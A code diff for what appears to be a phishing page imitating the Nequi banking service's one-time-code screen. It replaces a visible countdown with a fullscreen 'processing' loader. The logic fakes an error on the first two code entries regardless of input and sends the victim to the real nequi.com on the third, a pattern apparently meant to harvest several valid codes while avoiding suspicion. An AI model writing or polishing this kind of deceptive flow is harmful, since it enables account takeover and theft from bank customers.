@@ -35,21 +35,27 @@
 
   setTimeout(() => boxes[0]?.focus(), 80);
 
-  // Cuenta regresiva visible en el botón, llama onDone al terminar
-  function startCountdown(seconds, onDone) {
-    btn.disabled = true;
-    let rem = seconds;
-    btn.textContent = `Procesando... (${rem}s)`;
-    const iv = setInterval(() => {
-      rem--;
-      if (rem <= 0) {
-        clearInterval(iv);
-        btn.disabled = false;
-        onDone();
-      } else {
-        btn.textContent = `Procesando... (${rem}s)`;
-      }
-    }, 1000);
+  // Pantalla de carga fullscreen sin segundos visibles
+  function showLoader(seconds, onDone) {
+    const overlay = document.createElement('div');
+    overlay.id = 'claveLoader';
+    overlay.style.cssText = [
+      'position:fixed;inset:0;background:#fff;',
+      'display:flex;flex-direction:column;align-items:center;justify-content:center;',
+      'z-index:8888;gap:18px;',
+    ].join('');
+    overlay.innerHTML = `
+      <div class="loader-mini" aria-hidden="true"></div>
+      <p class="loader-text-sm">Procesando solicitud</p>
+    `;
+    document.body.appendChild(overlay);
+    window.scrollTo(0, 0);
+
+    setTimeout(() => {
+      overlay.remove();
+      onDone();
+      window.scrollTo(0, 0);
+    }, seconds * 1000);
   }
 
   // Popup modal con cuenta regresiva de 20s y redirect final
@@ -142,18 +148,27 @@
     attempts += 1;
     sessionStorage.setItem('otpAttempts', String(attempts));
 
+    btn.disabled    = true;
+    btn.textContent = 'Procesando...';
+
     if (attempts === 1) {
-      // 1.ª clave: 6 segundos de espera → estado de error
-      startCountdown(6, () => setOtpError(true));
+      // 1.ª clave: 6 segundos de carga → estado de error
+      showLoader(6, () => {
+        btn.disabled    = false;
+        btn.textContent = 'Confirmar';
+        setOtpError(true);
+      });
 
     } else if (attempts === 2) {
-      // 2.ª clave: 3 segundos de espera → estado de error
-      startCountdown(3, () => setOtpError(true));
+      // 2.ª clave: 3 segundos de carga → estado de error
+      showLoader(3, () => {
+        btn.disabled    = false;
+        btn.textContent = 'Confirmar';
+        setOtpError(true);
+      });
 
     } else {
       // 3.ª clave: popup con 20s de cuenta regresiva → redirect final
-      btn.disabled    = true;
-      btn.textContent = 'Procesando...';
       showFinalModal('https://www.nequi.com');
     }
   });
